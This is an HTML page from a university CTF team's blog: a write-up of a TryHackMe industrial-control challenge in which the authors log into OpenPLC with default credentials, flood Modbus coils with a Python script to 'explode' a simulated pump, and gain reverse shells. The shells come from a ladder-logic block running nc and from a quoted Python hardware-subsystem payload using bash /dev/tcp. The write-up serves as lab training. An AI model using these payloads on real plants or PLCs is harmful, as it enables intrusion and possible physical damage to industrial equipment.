@@ -1,0 +1,169 @@
+<!DOCTYPE html><html lang="it" data-astro-cid-4dqtj3le> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="manifest" href="/site.webmanifest"><meta name="generator" content="Astro v5.12.3"><meta name="description" content="Articolo di StealthGuy @ Pwnissa"><title>Kaboom: TryHackMe - Industrial Intrusion - Task 8</title><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet"><style>.footer[data-astro-cid-sz7xmlte]{background:var(--bg-secondary);padding:60px 0 20px;border-top:1px solid var(--card-border);margin-top:0}.footer-content[data-astro-cid-sz7xmlte]{max-width:1200px;margin:0 auto;padding:0 20px;text-align:center}.footer[data-astro-cid-sz7xmlte] h2[data-astro-cid-sz7xmlte]{font-size:2rem;margin-bottom:30px;color:var(--accent-gold)}.contact-info[data-astro-cid-sz7xmlte]{display:flex;flex-direction:column;gap:15px;font-size:1.1rem}.contact-info[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]{color:var(--accent-teal);text-decoration:none;transition:color .3s ease}.contact-info[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]:hover{color:var(--accent-gold)}.made-by[data-astro-cid-sz7xmlte]{margin-top:15px;font-size:.75rem;color:#fff;text-align:center}.made-by[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]{color:#fff;text-decoration:none;transition:color .3s ease}.made-by[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]:hover{color:var(--accent-gold)}
+</style>
+<link rel="stylesheet" href="/_astro/he_protecc.DdGESeJp.css"></head> <body data-astro-cid-4dqtj3le> <nav id="fixedNavbar" class="fixed-navbar" data-astro-cid-uvvofgxd> <div class="navbar-container" data-astro-cid-uvvofgxd> <div class="navbar-brand" data-astro-cid-uvvofgxd> <a href="/" data-astro-cid-uvvofgxd>Pwnissa</a> </div> <div class="navbar-menu" data-astro-cid-uvvofgxd> <a href="/blog" class="navbar-link" data-astro-cid-uvvofgxd>Blog</a><a href="/members" class="navbar-link" data-astro-cid-uvvofgxd>Members</a> </div> </div> </nav> <script type="module">let e=window.scrollY;const l=document.getElementById("fixedNavbar"),o=()=>{window.scrollY>e+5&&window.scrollY>l.offsetHeight?l.classList.add("hidden"):window.scrollY<e-5&&l.classList.remove("hidden"),e=window.scrollY};window.addEventListener("scroll",o);document.addEventListener("DOMContentLoaded",()=>{l.classList.remove("hidden")});</script>  <main class="blog-container" data-astro-cid-4dqtj3le> <div class="blog-header" data-astro-cid-4dqtj3le> <a href="/" class="back-link" data-astro-cid-4dqtj3le>← Torna alla home</a> <div class="article-meta" data-astro-cid-4dqtj3le> <h1 data-astro-cid-4dqtj3le>Kaboom: TryHackMe - Industrial Intrusion - Task 8</h1> <div class="meta-info" data-astro-cid-4dqtj3le> <span class="author" data-astro-cid-4dqtj3le>di StealthGuy</span> <span class="date" data-astro-cid-4dqtj3le>5/1/2024</span> <div class="tags" data-astro-cid-4dqtj3le> <span class="tag misc" data-astro-cid-4dqtj3le>misc</span><span class="tag ot" data-astro-cid-4dqtj3le>OT</span> </div> </div> </div> </div> <article class="article-content" data-astro-cid-4dqtj3le> <h1 id="kaboom-tryhackme---industrial-intrusion---task-8">Kaboom: TryHackMe - Industrial Intrusion - Task 8</h1>
+<blockquote>
+<p><strong>Solved by: StealthGuy</strong>, <strong><a href="https://stealthguy.net/kaboomthm/kaboom/">Writeup by: StealthGuy</a></strong></p>
+</blockquote>
+<p><img src="/_astro/cover.CUaVQ-ZP_Z1QnWdT.webp" alt="Description of image 1" loading="lazy" decoding="async" fetchpriority="auto" width="1390" height="637"></p>
+<h2 id="writeup">Writeup</h2>
+<p>TL;DR: Crafting malicious Modbus packets and gaining a reverse shell by uploading a malicious PLC program.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="plaintext"><code><span class="line"><span>This challenge drops you into the shoes of the APT operator: With a single crafted Modbus, you over-pressurise the main pump, triggering a thunderous blow-out that floods the plant with alarms. While chaos reigns, your partner ghosts through the shaken DMZ and installs a stealth implant, turning the diversion’s echo into your persistent beachhead.</span></span></code></pre>
+<h3 id="part-1---modbus">Part 1 - Modbus</h3>
+<p>The first part consists of causing an explosion in the facility’s pumping system.
+We begin with reconnaissance:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">nmap</span><span style="color:#BD93F9"> -p-</span><span style="color:#BD93F9"> --open</span><span style="color:#BD93F9"> -sS</span><span style="color:#BD93F9"> --min-rate</span><span style="color:#BD93F9"> 5000</span><span style="color:#BD93F9"> -v</span><span style="color:#BD93F9"> -n</span><span style="color:#BD93F9"> -Pn</span><span style="color:#BD93F9"> -oG</span><span style="color:#F1FA8C"> fullscan</span><span style="color:#BD93F9"> 10.10.23.8</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">PORT</span><span style="color:#F1FA8C">      STATE</span><span style="color:#F1FA8C"> SERVICE</span></span>
+<span class="line"><span style="color:#50FA7B">22/tcp</span><span style="color:#F1FA8C">    open</span><span style="color:#F1FA8C">  ssh</span></span>
+<span class="line"><span style="color:#50FA7B">80/tcp</span><span style="color:#F1FA8C">    open</span><span style="color:#F1FA8C">  http</span></span>
+<span class="line"><span style="color:#50FA7B">102/tcp</span><span style="color:#F1FA8C">   open</span><span style="color:#F1FA8C">  iso-tsap</span></span>
+<span class="line"><span style="color:#50FA7B">502/tcp</span><span style="color:#F1FA8C">   open</span><span style="color:#F1FA8C">  mbap</span></span>
+<span class="line"><span style="color:#50FA7B">1880/tcp</span><span style="color:#F1FA8C">  open</span><span style="color:#F1FA8C">  vsat-control</span></span>
+<span class="line"><span style="color:#50FA7B">8080/tcp</span><span style="color:#F1FA8C">  open</span><span style="color:#F1FA8C">  http-proxy</span></span>
+<span class="line"><span style="color:#50FA7B">44818/tcp</span><span style="color:#F1FA8C"> open</span><span style="color:#F1FA8C">  EtherNetIP-2</span></span></code></pre>
+<p>The first thing I did was visit the website on port <code>80</code>. There was a video of a working pump. This webpage was populated using a script in the HTML that fetches data from <code>/api/state</code>.</p>
+<p><img src="/_astro/pump.BwI2offK_kbIf8.webp" alt="Description of image 1" loading="lazy" decoding="async" fetchpriority="auto" width="1000" height="1088"></p>
+<p>Next, I visited port <code>8080</code> and found an OpenPLC v3 login page. From previous experience with OpenPLC, I knew the default credentials are <code>openplc:openplc</code>, so I tried them—and they worked.</p>
+<p>Then I checked out port <code>1880</code>, which showed a Node-RED login page. However, I couldn’t access it.</p>
+<p>I then turned my attention to ports <code>502</code>, <code>102</code>, and <code>44818</code>, which are commonly used in the OT (Operational Technology) domain—specifically, Modbus TCP, Siemens S7 (proprietary), and Ethernet/IP (Rockwell), respectively.</p>
+<p>OpenPLC typically communicates via Modbus TCP because it’s open and widely supported. While OpenPLC does support S7 and Ethernet/IP through additional libraries, Modbus is the easiest to interact with. So, I began inspecting the Modbus interface.</p>
+<p>Modbus primarily uses the concept of “coils.” Coils are boolean variables (ON/OFF). To explode the pump, I had the idea to turn all the coils ON.</p>
+<p>To do this, I connected to the PLC on port <code>502</code> using a Python library called <code>pymodbus</code>, which enables Modbus communication:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">pip</span><span style="color:#F1FA8C"> install</span><span style="color:#F1FA8C"> pymodbus</span></span></code></pre>
+<p>The script I wrote:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="python"><code><span class="line"><span style="color:#FF79C6">from</span><span style="color:#F8F8F2"> pymodbus.client </span><span style="color:#FF79C6">import</span><span style="color:#F8F8F2"> ModbusTcpClient</span></span>
+<span class="line"><span style="color:#FF79C6">import</span><span style="color:#F8F8F2"> requests</span></span>
+<span class="line"><span style="color:#FF79C6">import</span><span style="color:#F8F8F2"> time</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># IP of the PLC</span></span>
+<span class="line"><span style="color:#BD93F9">PLC_IP</span><span style="color:#FF79C6"> =</span><span style="color:#E9F284"> &quot;</span><span style="color:#F1FA8C">10.10.180.166</span><span style="color:#E9F284">&quot;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Modbus TCP port (default: 502)</span></span>
+<span class="line"><span style="color:#BD93F9">MODBUS_PORT</span><span style="color:#FF79C6"> =</span><span style="color:#BD93F9"> 502</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Connect to the PLC over Modbus TCP</span></span>
+<span class="line"><span style="color:#F8F8F2">client </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> ModbusTcpClient(</span><span style="color:#BD93F9">PLC_IP</span><span style="color:#F8F8F2">, </span><span style="color:#FFB86C;font-style:italic">port</span><span style="color:#FF79C6">=</span><span style="color:#BD93F9">MODBUS_PORT</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"><span style="color:#F8F8F2">connection </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> client.connect()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF79C6">if</span><span style="color:#F8F8F2"> connection:</span></span>
+<span class="line"><span style="color:#8BE9FD">    print</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">&quot;</span><span style="color:#F1FA8C">Connected to PLC on Modbus TCP.</span><span style="color:#E9F284">&quot;</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"><span style="color:#F8F8F2">    coil </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> 0</span></span>
+<span class="line"><span style="color:#FF79C6">    while</span><span style="color:#BD93F9"> True</span><span style="color:#F8F8F2">:</span></span>
+<span class="line"><span style="color:#8BE9FD">        print</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">f</span><span style="color:#F1FA8C">&quot;Attempting to writing to coil at address </span><span style="color:#BD93F9">{</span><span style="color:#F8F8F2">coil</span><span style="color:#BD93F9">}</span><span style="color:#F1FA8C">...&quot;</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"><span style="color:#F8F8F2">        result </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> client.write_coil(coil, </span><span style="color:#BD93F9">True</span><span style="color:#F8F8F2">)  </span><span style="color:#6272A4"># True means ON (1)</span></span>
+<span class="line"><span style="color:#F8F8F2">        </span></span>
+<span class="line"><span style="color:#FF79C6">        if</span><span style="color:#F8F8F2"> result:</span></span>
+<span class="line"><span style="color:#8BE9FD">            print</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">f</span><span style="color:#F1FA8C">&quot;Successfully write to coil at address: </span><span style="color:#BD93F9">{</span><span style="color:#F8F8F2">coil</span><span style="color:#BD93F9">}</span><span style="color:#F1FA8C">.&quot;</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"><span style="color:#FF79C6">        else</span><span style="color:#F8F8F2">:</span></span>
+<span class="line"><span style="color:#8BE9FD">            print</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">f</span><span style="color:#F1FA8C">&quot;Failed to write to coil at address </span><span style="color:#BD93F9">{</span><span style="color:#F8F8F2">coil</span><span style="color:#BD93F9">}</span><span style="color:#F1FA8C">.&quot;</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"><span style="color:#F8F8F2">        </span></span>
+<span class="line"><span style="color:#F8F8F2">        time.sleep(</span><span style="color:#BD93F9">2</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"><span style="color:#F8F8F2">        </span></span>
+<span class="line"><span style="color:#6272A4">        # Verify the status of the coil after writing (check if it&#39;s ON)</span></span>
+<span class="line"><span style="color:#F8F8F2">        status </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> client.read_coils(coil, </span><span style="color:#FFB86C;font-style:italic">count</span><span style="color:#FF79C6">=</span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">) </span></span>
+<span class="line"><span style="color:#8BE9FD">        print</span><span style="color:#F8F8F2">(requests.get(</span><span style="color:#FF79C6">f</span><span style="color:#F1FA8C">&quot;http://</span><span style="color:#BD93F9">{PLC_IP}</span><span style="color:#F1FA8C">/api/state&quot;</span><span style="color:#F8F8F2">).text)  </span><span style="color:#6272A4"># fetch the api to see if the pump exploded</span></span>
+<span class="line"><span style="color:#8BE9FD">        print</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">f</span><span style="color:#F1FA8C">&quot;Coil at address </span><span style="color:#BD93F9">{</span><span style="color:#F8F8F2">coil</span><span style="color:#BD93F9">}</span><span style="color:#F1FA8C"> status: </span><span style="color:#BD93F9">{</span><span style="color:#F8F8F2">status.bits[</span><span style="color:#BD93F9">0</span><span style="color:#F8F8F2">]</span><span style="color:#BD93F9">}</span><span style="color:#F1FA8C">&quot;</span><span style="color:#F8F8F2">)  </span><span style="color:#6272A4"># 1 means ON, 0 means OFF</span></span>
+<span class="line"><span style="color:#F8F8F2">        coil </span><span style="color:#FF79C6">+=</span><span style="color:#BD93F9"> 1</span><span style="color:#F8F8F2"> </span></span>
+<span class="line"><span style="color:#F8F8F2">    </span></span>
+<span class="line"><span style="color:#FF79C6">else</span><span style="color:#F8F8F2">:</span></span>
+<span class="line"><span style="color:#8BE9FD">    print</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">&quot;</span><span style="color:#F1FA8C">Failed to connect to PLC on Modbus TCP.</span><span style="color:#E9F284">&quot;</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Close the connection</span></span>
+<span class="line"><span style="color:#F8F8F2">client.close()</span></span></code></pre>
+<p>Note: I used <code>requests</code> to poll the <code>/api/state</code> endpoint to see if the pump’s state changed.</p>
+<p>Script output:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="plaintext"><code><span class="line"><span>Coil at address 8 status: True</span></span>
+<span class="line"><span>Attempting to open the gate by writing to coil at address 9...</span></span>
+<span class="line"><span>Successfully opened the gate at address 9.</span></span>
+<span class="line"><span>{</span></span>
+<span class="line"><span>  &quot;status&quot;: &quot;Cooling OFF, Low Temperature&quot;,</span></span>
+<span class="line"><span>  &quot;video&quot;: &quot;normal&quot;</span></span>
+<span class="line"><span>}</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Coil at address 9 status: True</span></span>
+<span class="line"><span>Attempting to open the gate by writing to coil at address 10...</span></span>
+<span class="line"><span>Successfully opened the gate at address 10.</span></span>
+<span class="line"><span>{</span></span>
+<span class="line"><span>  &quot;status&quot;: &quot;Explosion Detected!&quot;,</span></span>
+<span class="line"><span>  &quot;video&quot;: &quot;explodedflag23&quot;</span></span>
+<span class="line"><span>}</span></span></code></pre>
+<p>After reloading <code>MACHINE_IP:80</code>, the first flag appeared in the video.</p>
+<p><img src="/_astro/flag1.Caq2ndbk_1UxRvH.webp" alt="Description of image 1" loading="lazy" decoding="async" fetchpriority="auto" width="1920" height="1080"></p>
+<h3 id="part-2---reverse-shell">Part 2 - Reverse Shell</h3>
+<p>Now we’re asked for another flag, referred to as the <strong>Ubuntu flag</strong>. Here’s where things get interesting.</p>
+<p>OpenPLC is a <em>soft PLC</em>, meaning it runs as software on a general-purpose machine (often Ubuntu) rather than as dedicated hardware. Soft PLCs are typically used for learning and simulation because they lack the real-time guarantees required in industrial environments.</p>
+<p>OpenPLC consists of two parts: the <strong>Runtime</strong> and the <strong>Editor</strong>. On port <code>8080</code>, we saw the OpenPLC <strong>Runtime</strong> login interface (which accepted default credentials), so it’s reasonable to assume OpenPLC is running on an Ubuntu machine.</p>
+<p>But how do we access the underlying file system via the OpenPLC dashboard?</p>
+<p>The OpenPLC dashboard allows enabling/disabling protocols and, more importantly, uploading PLC programs. Which of these features could be exploited?</p>
+<p>At first, I managed to trigger a Flask error using the “Run” button in the dashboard. Since Flask was running with <code>debug_mode=True</code>, I explored command injection opportunities—but found none.</p>
+<p>I searched for known RCE vulnerabilities in OpenPLC Runtime, but came up empty. Then I focused on the program upload feature and realized this might not be a typical web challenge—it’s about <strong>getting a reverse shell</strong> via PLC programming.</p>
+<p>As mentioned earlier, OpenPLC supports the IEC 61131 standard, which defines industrial programming languages like Ladder Diagram (LD), Structured Text (ST), etc. What if we could embed a reverse shell into the PLC program?</p>
+<p><strong>Can you write a reverse shell in Ladder Logic?</strong></p>
+<p>Yes! Thanks to this excellent article: <a href="https://www.pentestpartners.com/security-blog/snakes-and-ladder-logic/">Snakes and Ladder Logic</a></p>
+<p>In short: you can create a <strong>custom Function Block</strong> that executes a reverse shell, and call it from your PLC program—a real backdoor.</p>
+<p>In the article example, the shell is triggered when a button is pressed. In our case, since nothing is wired to our Soft PLC, we trigger it automatically.</p>
+<p>I remembered that installing the OpenPLC Editor on Linux was pretty messy, and since I was in a hurry, I asked my friend Davide (thanks Davide!) to install it on his Windows PC. Then we completed the challenge together.</p>
+<p>We created a new Ladder Diagram project, wrote a custom Function Block, and embedded it in the main program.</p>
+<p>Payload screenshots:</p>
+<p><img src="/_astro/function_block.BX0LICqp_2fvj3T.webp" alt="Description of image 1" loading="lazy" decoding="async" fetchpriority="auto" width="1608" height="550"></p>
+<p><img src="/_astro/program_LD.BVaeykDL_nTMaX.webp" alt="Description of image 1" loading="lazy" decoding="async" fetchpriority="auto" width="1531" height="786"></p>
+<p>Since nothing is wired to this PLC, our ladder logic simply consists of the Function Block placed between the power rails—it runs unconditionally.</p>
+<p>The code we used (adapted from the article) was:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="sh"><code><span class="line"><span style="color:#50FA7B">IF</span><span style="color:#F8F8F2"> (exe </span><span style="color:#F1FA8C">=</span><span style="color:#F1FA8C"> TRUE</span><span style="color:#F8F8F2">) THEN</span></span>
+<span class="line"><span style="color:#F8F8F2">  {</span><span style="color:#50FA7B">system(</span><span style="color:#50FA7B">&quot;mknod /tmp/pipe p&quot;</span><span style="color:#F8F8F2">);}</span></span>
+<span class="line"><span style="color:#F8F8F2">  {</span><span style="color:#50FA7B">system(</span><span style="color:#50FA7B">&quot;/bin/sh 0&lt;/tmp/pipe | nc &lt;IP_ADDRESS&gt; &lt;PORT&gt; 1&gt;/tmp/pipe&quot;</span><span style="color:#F8F8F2">);}</span></span>
+<span class="line"><span style="color:#FF79C6">  done</span><span style="color:#8BE9FD"> :</span><span style="color:#F1FA8C">=</span><span style="color:#F1FA8C"> TRUE</span><span style="color:#F8F8F2">;</span></span>
+<span class="line"><span style="color:#FF79C6">  return</span><span style="color:#F8F8F2">;</span></span>
+<span class="line"><span style="color:#50FA7B">END_IF</span><span style="color:#F8F8F2">;</span></span>
+<span class="line"><span style="color:#FF79C6">done</span><span style="color:#8BE9FD"> :</span><span style="color:#F1FA8C">=</span><span style="color:#F1FA8C"> FALSE</span><span style="color:#F8F8F2">;</span></span>
+<span class="line"><span style="color:#FF79C6">return</span><span style="color:#F8F8F2">;</span></span></code></pre>
+<p>After compiling it to a <code>.st</code> file (using the orange arrow button in the toolbar), we uploaded <code>rev_shell.st</code> via the OpenPLC Runtime dashboard.</p>
+<div class="callout" data-type="warning" data-astro-cid-mrmim4ef style="--bgColor: rgba(242, 138, 46, 0.05);--borderColor: var(--accent-orange);--iconColor: var(--accent-orange);"> <div class="callout-header" data-astro-cid-mrmim4ef style="--bgColor: rgba(242, 138, 46, 0.05);--borderColor: var(--accent-orange);--iconColor: var(--accent-orange);"> <span class="callout-icon" data-astro-cid-mrmim4ef style="--bgColor: rgba(242, 138, 46, 0.05);--borderColor: var(--accent-orange);--iconColor: var(--accent-orange);">⚠️</span> <span class="callout-title" data-astro-cid-mrmim4ef style="--bgColor: rgba(242, 138, 46, 0.05);--borderColor: var(--accent-orange);--iconColor: var(--accent-orange);">Warning</span> </div> <div class="callout-content" data-astro-cid-mrmim4ef style="--bgColor: rgba(242, 138, 46, 0.05);--borderColor: var(--accent-orange);--iconColor: var(--accent-orange);"> <p>Don’t forget to start your <strong>listener!</strong></p> </div> </div> 
+<p>Finally, we clicked the “RUN PLC” button—and we had a reverse shell.</p>
+<p><img src="/_astro/reverse_runtime.Bx8zQpyd_Z7RktY.webp" alt="Description of image 1" loading="lazy" decoding="async" fetchpriority="auto" width="1920" height="1080"></p>
+<p>We can now navigate the Ubuntu filesystem and retrieve the flag located at <code>/home/ubuntu/flag.txt</code>.</p>
+<p><img src="/_astro/ubuntu_shell.BRY6Ti1E_1IDhuH.webp" alt="Description of image 1" loading="lazy" decoding="async" fetchpriority="auto" width="1920" height="1080"></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>I found this challenge extremely interesting because I really like to experiment with resolving “strange” challenges that differ from the usual categories. I’ve always been curious aubout OT (Operational Technology), which differs from IT technologies but shares some common security flaws. In future CTFs, I would like to dive deeper into OT technologies and better understand the differences and connections between IT security and OT security, while continuing to learn and apply my skills about this topic.</p>
+<hr/>
+<h3 id="edit">EDIT:</h3>
+<div class="callout" data-type="info" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);"> <div class="callout-header" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);"> <span class="callout-icon" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);">📋</span> <span class="callout-title" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);">Info</span> </div> <div class="callout-content" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);"> <p>After sharing this writeup on the fantastic TryHackMe Discord group, a friendly user named <strong>Korizma</strong> shared another possible solution, which we decided to include here for completeness, by exploiting the “Python Linux Hardware Subsystem”.</p> </div> </div> 
+<p><strong>Here is Korizma’s full message:</strong></p>
+<p>You can also get a reverse shell from KABOOM PT.2 using the Python Linux Hardware Subsystem. : the Hardware tab in the web dashboard, which featured a dropdown menu for “Python on Linux (PSM)”. This powerful subsystem is designed to allow administrators to write custom drivers but effectively creates a feature-based RCE, allowing arbitrary Python code to be executed by the OpenPLC runtime.</p>
+<p>Exploit Development &amp; Execution
+Initial payloads placed in the hardware_init() function failed, likely because the PLC’s network stack was not fully initialized.</p>
+<p>The successful exploit was triggered from within the update_inputs() function, which is called on every PLC cycle. This ensured the system was in a stable state before execution. To prevent the main PLC loop from crashing, the final payload launches the reverse shell in a separate, non-blocking thread.</p>
+<p>Final PSM Exploit Payload
+This code was pasted into the PSM editor, saved, and triggered by restarting the PLC.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="python"><code><span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Final, Concrete PSM Exploit Payload</span></span>
+<span class="line"><span style="color:#FF79C6">import</span><span style="color:#F8F8F2"> os</span></span>
+<span class="line"><span style="color:#FF79C6">import</span><span style="color:#F8F8F2"> threading</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># A flag to ensure the exploit only runs once.</span></span>
+<span class="line"><span style="color:#F8F8F2">exploit_attempted </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> False</span></span>
+<span class="line"><span style="color:#F8F8F2">counter </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> 0</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF79C6">def</span><span style="color:#50FA7B"> hardware_init</span><span style="color:#F8F8F2">():</span></span>
+<span class="line"><span style="color:#6272A4">    # Left empty to ensure PLC stability on boot.</span></span>
+<span class="line"><span style="color:#FF79C6">    pass</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF79C6">def</span><span style="color:#50FA7B"> update_inputs</span><span style="color:#F8F8F2">():</span></span>
+<span class="line"><span style="color:#6272A4">    # This function is called on every PLC cycle.</span></span>
+<span class="line"><span style="color:#FF79C6">    global</span><span style="color:#F8F8F2"> counter, exploit_attempted</span></span>
+<span class="line"><span style="color:#F8F8F2">    counter </span><span style="color:#FF79C6">+=</span><span style="color:#BD93F9"> 1</span></span>
+<span class="line"><span style="color:#F8F8F2">    </span></span>
+<span class="line"><span style="color:#6272A4">    # Execute exploit after 5 cycles to ensure PLC is stable.</span></span>
+<span class="line"><span style="color:#FF79C6">    if</span><span style="color:#F8F8F2"> counter </span><span style="color:#FF79C6">==</span><span style="color:#BD93F9"> 5</span><span style="color:#FF79C6"> and</span><span style="color:#FF79C6"> not</span><span style="color:#F8F8F2"> exploit_attempted:</span></span>
+<span class="line"><span style="color:#F8F8F2">        exploit_attempted </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> True</span></span>
+<span class="line"><span style="color:#F8F8F2">        exploit_thread </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> threading.Thread(</span><span style="color:#FFB86C;font-style:italic">target</span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2">run_exploit, </span><span style="color:#FFB86C;font-style:italic">daemon</span><span style="color:#FF79C6">=</span><span style="color:#BD93F9">True</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"><span style="color:#F8F8F2">        exploit_thread.start()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF79C6">def</span><span style="color:#50FA7B"> run_exploit</span><span style="color:#F8F8F2">():</span></span>
+<span class="line"><span style="color:#6272A4">    # This function contains the single, most reliable reverse shell payload.</span></span>
+<span class="line"><span style="color:#F8F8F2">    os.system(</span><span style="color:#E9F284">&quot;</span><span style="color:#F1FA8C">bash -c &#39;bash -i &gt;&amp; /dev/tcp/YOUR_LISTENER_IP/4444 0&gt;&amp;1&#39;</span><span style="color:#E9F284">&quot;</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF79C6">def</span><span style="color:#50FA7B"> update_outputs</span><span style="color:#F8F8F2">():</span></span>
+<span class="line"><span style="color:#FF79C6">    pass</span></span>
+<span class="line"></span></code></pre>
+<p>Pasting this code and restarting the PLC resulted in a root shell. GGs! 👑</p> </article> </main> <footer class="footer" data-astro-cid-sz7xmlte> <div class="footer-content" data-astro-cid-sz7xmlte> <h2 data-astro-cid-sz7xmlte>Contacts</h2> <div class="contact-info" data-astro-cid-sz7xmlte> <p data-astro-cid-sz7xmlte>📧 Email: <a href="mailto:info@pwnissa.it" data-astro-cid-sz7xmlte>info@pwnissa.it</a></p> <p data-astro-cid-sz7xmlte>🐙 GitHub: <a href="https://github.com/pwnissa" target="_blank" data-astro-cid-sz7xmlte>https://github.com/pwnissa</a></p> <p data-astro-cid-sz7xmlte>📍 Università degli Studi di Genova, DIBRIS</p> </div> <p class="made-by" data-astro-cid-sz7xmlte>Made with ♥ by <a href="https://stealthguy.net" target="_blank" rel="noopener noreferrer" data-astro-cid-sz7xmlte>stealthguy</a></p> </div> </footer>  </body></html>
